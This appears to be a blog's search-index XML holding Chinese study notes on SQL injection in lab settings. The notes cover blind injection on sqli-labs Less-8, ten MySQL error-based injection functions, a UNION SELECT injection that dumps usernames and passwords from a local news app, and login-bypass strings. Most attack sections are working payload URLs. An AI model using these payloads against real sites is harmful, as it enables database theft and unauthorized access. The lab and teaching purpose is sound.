<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Welcome</title>
      <link href="/2019/08/29/welcome/"/>
      <url>/2019/08/29/welcome/</url>
      
        <content type="html"><![CDATA[<!-- excerpt -->]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>练习10</title>
      <link href="/2019/08/28/practice10/"/>
      <url>/2019/08/28/practice10/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 盲注总结，目标站点是 <code>sqli-labs</code> 中的 <code>Less-8</code></p><a id="more"></a><!--export--><!--toc--><h3 id="找注入点"><a href="#找注入点" class="headerlink" title="找注入点"></a>找注入点</h3><p>拿到一个目标站点首先找到注入点，<code>Less-8</code> 注入点为 <code>?id=1</code></p><h3 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h3><p>发现输入 <code>id=1&#39;</code> 后页面的 <code>You are in ...</code> 消失了，没有报错信息。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1'</span><br></pre></td></tr></table></figure><p>再次输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' --+</span><br></pre></td></tr></table></figure><p>页面正常显示，所以该注入点为字符型注入，由于页面不显示错误信息，所以使用盲注的方法。</p><h3 id="判断数据库个数"><a href="#判断数据库个数" class="headerlink" title="判断数据库个数"></a>判断数据库个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(schema_name) from information_schema.schemata)&gt;4 --+</span><br></pre></td></tr></table></figure><p><img src="/images/127errorInjec_count.png" alt></p><p>发现 <code>&gt;4</code>正常显示，<code>&gt;5</code>不正常，故可知数据库个数为 5。</p><h3 id="判断各数据库名的长度"><a href="#判断各数据库名的长度" class="headerlink" title="判断各数据库名的长度"></a>判断各数据库名的长度</h3><p>先判断第一个数据库名的长度</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select schema_name from information_schema.schemata limit 0,1))&gt;17 --+</span><br></pre></td></tr></table></figure><p><img src="/images/128fires_schemata_length.png" alt></p><p>可得第一个库的长度为 18 。</p><h3 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select schema_name from information_schema.schemata limit 0, 1), 1, 1)) &gt;104 --+</span><br></pre></td></tr></table></figure><p>可得第一个字符为 <code>i</code> 。</p><p><img src="/images/125errorInjec_schema.png" alt></p><p>继续往下做判断</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select schema_name from information_schema.schemata limit 0, 1), 1, 1)) &gt;109 --+</span><br></pre></td></tr></table></figure><p><img src="/images/126errorInjec_judge_schemata.png" alt></p><p>可得第二个字符是 <code>n</code></p><p>可以以此判断出数据库中各个库名。</p><h3 id="判断当前数据库中表的个数"><a href="#判断当前数据库中表的个数" class="headerlink" title="判断当前数据库中表的个数"></a>判断当前数据库中表的个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br></pre></td></tr></table></figure><p><img src="/images/129count_current_database_tables.png" alt></p><h3 id="判断当前数据库中各个表名的长度"><a href="#判断当前数据库中各个表名的长度" class="headerlink" title="判断当前数据库中各个表名的长度"></a>判断当前数据库中各个表名的长度</h3><p>先判断第一个表名长度</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 --+</span><br></pre></td></tr></table></figure><p><img src="/images/130count_current_table_length.png" alt></p><h3 id="判断当前数据库中表名"><a href="#判断当前数据库中表名" class="headerlink" title="判断当前数据库中表名"></a>判断当前数据库中表名</h3><p>判断第一个表名</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0, 1), 1, 1)) &gt;100 --+</span><br></pre></td></tr></table></figure><p><img src="/images/130juage_table_name.png" alt></p><p>字符为 <code>e</code> ，继续判断可以得出该表名为 <code>emails</code>。</p><h3 id="查看-users-表中字段个数"><a href="#查看-users-表中字段个数" class="headerlink" title="查看 users 表中字段个数"></a>查看 <code>users</code> 表中字段个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') &gt; 2 --+</span><br></pre></td></tr></table></figure><p><img src="/images/131.png" alt></p><p>个数为 3 。</p><h3 id="判断-users-表中第一个字段长度"><a href="#判断-users-表中第一个字段长度" class="headerlink" title="判断 users 表中第一个字段长度"></a>判断 <code>users</code> 表中第一个字段长度</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1)) &gt; 1 --+</span><br></pre></td></tr></table></figure><p>第一个字段长度为 2 。</p><h3 id="判断第一个字段"><a href="#判断第一个字段" class="headerlink" title="判断第一个字段"></a>判断第一个字段</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0, 1), 1, 1)) &gt;104 --+</span><br></pre></td></tr></table></figure><p><img src="/images/133.png" alt></p><p>不难判断出第一个字段为 <code>id</code>。</p><h3 id="判断users-表行数"><a href="#判断users-表行数" class="headerlink" title="判断users 表行数"></a>判断<code>users</code> 表行数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(*) from security.users) &gt;13 --+</span><br></pre></td></tr></table></figure><p><img src="/images/134.png" alt></p><p>可以查看 <code>users</code>表中的内容。</p><h3 id="总结-SQL-盲注流程"><a href="#总结-SQL-盲注流程" class="headerlink" title="总结 SQL 盲注流程"></a>总结 SQL 盲注流程</h3><ol><li>先找注入点</li><li>判断类型<ol><li>字符型？整型？</li><li>盲注还是 <code>UNION SELECT</code></li></ol></li><li>先查一共有几个数据库</li><li>再查各个数据库长度，为判断库名做准备</li><li>依次判断出数据库的名称，找到自己想要查询的库</li><li>先查库中有几个表</li><li>查各个表的长度</li><li>依次判断出各个表名</li><li>查表中有几个字段</li><li>查各个字段长度</li><li>依次判断字段名</li><li>判断出想要字段的数据</li></ol><h3 id="用burpsuite判断"><a href="#用burpsuite判断" class="headerlink" title="用burpsuite判断"></a>用burpsuite判断</h3><p>把要做判断的 <code>url</code> 发送到 <code>Intruder</code></p><p><img src="/images/135.png" alt></p><p>点击 <code>Clear $</code> ，在 <code>=%27i%27</code> 中字母 <code>i</code> 两边加上 <code>$</code> ，然后点击 <code>Payloads</code>，在 <code>Payload type</code> 选择 <code>Brute forcer</code>，<code>Min length</code> 选择 <code>1</code>，<code>Max length</code> 选择 <code>1</code>。</p><p><img src="/images/136.png" alt></p><p>然后点击 <code>Start attack</code></p><p><img src="/images/137.png" alt></p><p><img src="/images/138.png" alt></p><p>继续改变位置可查出库名，同理表名，字段名也可以查出。</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note33</title>
      <link href="/2019/08/28/note33/"/>
      <url>/2019/08/28/note33/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 盲注</p><a id="more"></a><!--export--><!--toc--><h3 id="URL-注释"><a href="#URL-注释" class="headerlink" title="URL 注释"></a><code>URL</code> 注释</h3><ol><li><code>-- |</code> 空格后面可以跟上任何字符</li><li><code>--+</code> <code>URL</code> 中会把 <code>+</code> 解析为空格</li><li><code>#</code> 识别为锚点</li></ol><p><code>GET</code> 参数会被 <code>url</code> 编码，但 <code>POST</code> 参数不会被 <code>url</code> 编码，请求头也不会编码。</p><p>整型 <code>id=26-1</code>可以用，但 <code>id=3+9</code> 却不能用，因为 <code>+</code> 解析为空格。</p><table><thead><tr><th align="center">符号</th><th align="center"><code>url</code> 编码</th></tr></thead><tbody><tr><td align="center">空格</td><td align="center">%20</td></tr><tr><td align="center">‘</td><td align="center">%27</td></tr><tr><td align="center">#</td><td align="center">%23</td></tr><tr><td align="center">“</td><td align="center">%22</td></tr><tr><td align="center">%</td><td align="center">%25</td></tr><tr><td align="center">&amp;</td><td align="center">%26</td></tr><tr><td align="center">/</td><td align="center">%2F</td></tr></tbody></table><h3 id="十种-MySQL-报错注入"><a href="#十种-MySQL-报错注入" class="headerlink" title="十种 MySQL 报错注入"></a>十种 <code>MySQL</code> 报错注入</h3><ol><li><code>floor()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><p><code>floor()</code> 报错注入准确地说应该是 <code>floor</code>，<code>count</code>，<code>group by</code> 冲突报错。特定情况下，三个函数在一起使用会产生错误。</p><p>经典的 <code>floor</code> 注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><p>首先看 <code>floor()</code> 报错产生条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*), concat(database(), floor(rand(0)*2))x from security.users group by x</span><br></pre></td></tr></table></figure><p>语句中 <code>x</code> 是给 <code>floor(rand(0)*2)</code>添加一个别名，执行该语句得到： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!#1062 - Duplicate entry &apos;security1&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure><p><code>floor()</code> 报错原理分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(), floor(rand(0)*2) as x from information_schema_tables groupby a;</span><br></pre></td></tr></table></figure><p>重点在 <code>group by a</code> ，即 <code>group by floor(rand(0)*2)</code>。首先，<code>floor(rand(0)*2)</code> 意思是随机产生 0 或 1。虽说是随机的，但有规律可循，基本上是 <code>011011</code>这个序列。</p><p>为什么报错？</p><p>首先，系统会建立一个虚拟表：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>假设有表：</p><table><thead><tr><th align="center">id</th><th align="center">name</th><th align="center">age</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">11</td><td align="center">18</td></tr><tr><td align="center">2</td><td align="center">22</td><td align="center">19</td></tr><tr><td align="center">3</td><td align="center">33</td><td align="center">20</td></tr><tr><td align="center">4</td><td align="center">44</td><td align="center">20</td></tr><tr><td align="center">5</td><td align="center">55</td><td align="center">18</td></tr></tbody></table><p>执行 <code>count(*) from ... group by age</code> 的过程中，会形成这样的虚拟表：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">18</td><td align="center">2</td></tr><tr><td align="center">19</td><td align="center">1</td></tr><tr><td align="center">20</td><td align="center">2</td></tr></tbody></table><p>那么这个表是如何形成的？由于 <code>group by</code> 的是 <code>age</code>，第一次读取的是 18 ，在虚拟表中寻找是否已经存在 18 ，由于表是空的，直接插入一条新数据，这时虚拟表变成这样：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">18</td><td align="center">1</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>下一个时 19 ，由于虚拟表中依旧没有 key 为 19 的字段，故插入。再插入 20 ，和 19 的情况一样，当继续插入 第二个 20 时，由于已经有了 20 ，故将 key 为 20 的字段的 count(*) 的值加 1，依次类推，形成最后的虚拟表：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">18</td><td align="center">2</td></tr><tr><td align="center">19</td><td align="center">1</td></tr><tr><td align="center">20</td><td align="center">2</td></tr></tbody></table><p>如何将 <code>group by</code> 与 <code>floor</code> 联合起来，进行 <code>floor</code> 报错？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(), floor(rand(0)*2) as a from information_schema.tables group by a;</span><br></pre></td></tr></table></figure><p><code>group by</code> 的是 <code>floor(rand(0)*2)</code> 每次运算的值都是随机的，首先，建立一张虚拟表，</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>接着，进行 <code>group by floor(rand(0)*2)</code> 。floor 表达式第一次运算的值为 0 ，在表中没有找到 key 为 0 的数据，故插入，在插入过程中需要再取一次  group by 后面的值，即在执行一次 floor 运算，结果为 1，取到了 1 ，插入数据，并将 count() 置 1.</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">1</td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>再进行 group by floor(rand(0)2)，表为</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">2</td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>执行到第四次 floor 运算时，这次值为 0 ，表中没有找到 key 为 0 的数据，故应当插入一条新数据，插入时，进行 floor 运算，这时值为 1，将 count(*) 置 1 。但虚拟表中已经有了 key 为 1数据，故此时会抛出主键冗余的异常，这就是所谓的 floor 报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><ol start="2"><li><code>extractvalue()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure><ol start="3"><li><code>updatexml()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure><ol start="4"><li><code>geometrycollection()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="5"><li><code>multipoint()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="6"><li><code>polygon()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="7"><li><code>multipolygon()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="8"><li><code>linestring()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="9"><li><code>exp()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure><ol start="10"><li><code>multilinestring()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><p>其中，对于 <code>mariadb</code> ，方法 <code>1-3</code> 适用，<code>mysql 8.0</code>  方法 <code>2-3</code> 可用，<code>mysql 5.0</code> 方法 <code>1-9</code> 适用。</p><h3 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL 盲注"></a>SQL 盲注</h3><p>盲注流程：</p><ol><li>先判断总数</li><li>判断单个长度</li><li>逐个字符判断名称，二分法</li></ol><p>常用函数</p><table><thead><tr><th align="center">函数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">ascii(‘A’)</td><td align="center">查看 ASCII 码</td></tr><tr><td align="center">char(100)</td><td align="center">通过 ASCII 码，查看字符</td></tr><tr><td align="center">substr/mid(str, start,length)</td><td align="center">截取字符</td></tr><tr><td align="center">length(string)</td><td align="center">计算字符串长度</td></tr><tr><td align="center">count( )</td><td align="center">统计个数</td></tr></tbody></table><p>常用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 库名</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and select group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 库名长度</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and length((select group_concat(schema_name) from information_schema.schemata)) &gt; 50 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 判断各个字符 ASCII</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and ascii(mid((select group_concat(schema_name) from information_schema.schemata), 1, 1)) &gt; 50 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos;and (select count(distinct schema_name) from information_schema.schemata) &gt; 3 ——+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and mid((select distinct schema_name from information_schema.schemata limit 0,1), 1, 1) &gt; 50 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前数据中有几张表</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and (select count(table_name) from information_schema.tables where table_schema = database()) &gt; 1 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看一张表的名字</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) &gt; 1 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and ascii(mid((select table_name from information_schema.tables where table_schema = database() limit 0,1), 1, 1)) &gt; 100 --+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL 盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>练习9</title>
      <link href="/2019/08/27/practice9/"/>
      <url>/2019/08/27/practice9/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 对新闻管理系统进行 SQL 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="UNION-SELECT-注入"><a href="#UNION-SELECT-注入" class="headerlink" title="UNION SELECT 注入"></a>UNION SELECT 注入</h3><p><a href="http://192.168.100.166/display.php" target="_blank" rel="noopener">测试网址</a></p><h4 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h4><p>首先进入到一个电影介绍页面，网址上有 <code>id</code> 可能存在 SQL 注入</p><p>先在 把<code>id=3</code>改成 <code>id=3-1</code> 发现内容改变了，故可得为整型，若为字符型则内容不变。 </p><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><p>因为整型注入故直接在后面加上<code>order by</code> 即可，发现字段数为 3</p><p><img src="/images/110.png" alt></p><p>然后先用</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,2,3</span><br></pre></td></tr></table></figure><p>判断各字段输出的位置，然后再正式开始 SQL 注入</p><h4 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h4><h5 id="查看数据库名"><a href="#查看数据库名" class="headerlink" title="查看数据库名"></a>查看数据库名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT group_concat(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA),3</span><br></pre></td></tr></table></figure><p><img src="/images/111.png" alt></p><p>可以看书我们所需要查看的表名是 <code>mynews</code></p><h5 id="查看-mynews-库中的表名"><a href="#查看-mynews-库中的表名" class="headerlink" title="查看 mynews 库中的表名"></a>查看 <code>mynews</code> 库中的表名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),3</span><br></pre></td></tr></table></figure><p><img src="/images/112.png" alt></p><h5 id="查看-tb-users-表中的列名"><a href="#查看-tb-users-表中的列名" class="headerlink" title="查看 tb_users 表中的列名"></a>查看 <code>tb_users</code> 表中的列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&apos;tb_users&apos;,3</span><br></pre></td></tr></table></figure><p><img src="/images/113.png" alt></p><h5 id="查看-username-和-password-字段的数据"><a href="#查看-username-和-password-字段的数据" class="headerlink" title="查看 username 和 password 字段的数据"></a>查看 <code>username</code> 和 <code>password</code> 字段的数据</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(username, &apos;-&apos;, password) FROM `db_mynews`.`tb_users`),3</span><br></pre></td></tr></table></figure><p><img src="/images/114.png" alt></p><h4 id="排序功能注入"><a href="#排序功能注入" class="headerlink" title="排序功能注入"></a>排序功能注入</h4><p>分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM news WHERE title like &apos;%1%&apos; or content like &apos;%1%&apos; or author like &apos;%1%&apos; order by &apos;%1%&apos;</span><br></pre></td></tr></table></figure><p>首先要判断查询时，哪个字段在前面，否则会影响后面注入过程。</p><p>排序界面有三列，分别为标题，内容和作者。所以我们要从这三个方向入手。经过简单的试错，我们可以判断出来标题在最前面。</p><p>然后再搜索框输入 <code>好%&#39; ORDER BY 3</code> 显示正常，然后再修改为 <code>好%&#39; UNION SELECT 1,2,3#</code></p><p><img src="/images/115.png" alt></p><p>把第二个位置换成 <code>user()</code></p><p><img src="/images/116.png" alt></p><p>然后就可以继续进行其他信息的查询了，和前面一样，这里不再重复。</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note32</title>
      <link href="/2019/08/27/note32/"/>
      <url>/2019/08/27/note32/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 万能密码，SQL 注入的分类以及简单的 SQL 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><p>搭建好环境后，关机快照，虚拟机不要留下任何关于自己的信息，禁止虚拟机和物理机的连接，虚拟机的主机名随意取，每做完一次渗透后，恢复到初始化快照。</p><p>重视：主机名+时间+电量+剪切板</p><h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; AND `password`= &apos;password&apos;</span><br></pre></td></tr></table></figure><p>当用户输入 <code>admin&#39; or 1 #</code> 时，带入上面的语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#多行结果，需要碰运气，在验证密码时，有一个用户密码是我们输入的密码</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#一行结果，admin的没用，因为不知道admin密码，验证密码会失败</span><br></pre></td></tr></table></figure><p>可以明显看到后面的有关查询密码的句子被注释掉了，前面是个永真条件。即这条 SQL 语句查询的是所有用户名，登录之后只显示一条数据，有可能是第一条也有可能是其他，具体看程序如何解析。</p><p>要想只输出一条语句可以用下面语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#1. 直接把后面全部注释掉   admin&apos; #</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#2. 把or换成and      admin&apos; and 1 #</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#3. 加入limit限制        admin&apos; or 1 limit 0,1 #</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br></pre></td></tr></table></figure><p>做用户登录功能时，有两种实现思路，一种是像上面这样直接用用户名和密码查询，另一种是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos;;</span><br></pre></td></tr></table></figure><p>然后再用 <code>if(查询出来的密码和输入的密码是否相等)</code> 来判断，实现方法不同，具体的注入手段也不同，应具体问题具体分析。</p><h4 id="SQL-注入原理介绍"><a href="#SQL-注入原理介绍" class="headerlink" title="SQL 注入原理介绍"></a>SQL 注入原理介绍</h4><p>当 Web 应用向后台数据库传递 SQL 语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊 SQL 语句，直接输入数据库引擎执行，获取和修改数据库中的数据。</p><p><strong>SQL 注入漏洞本质</strong>：把用户输入的数据当做代码来执行，违背了 “<strong>数据与代码分离</strong>“的原则。</p><p><strong>SQL 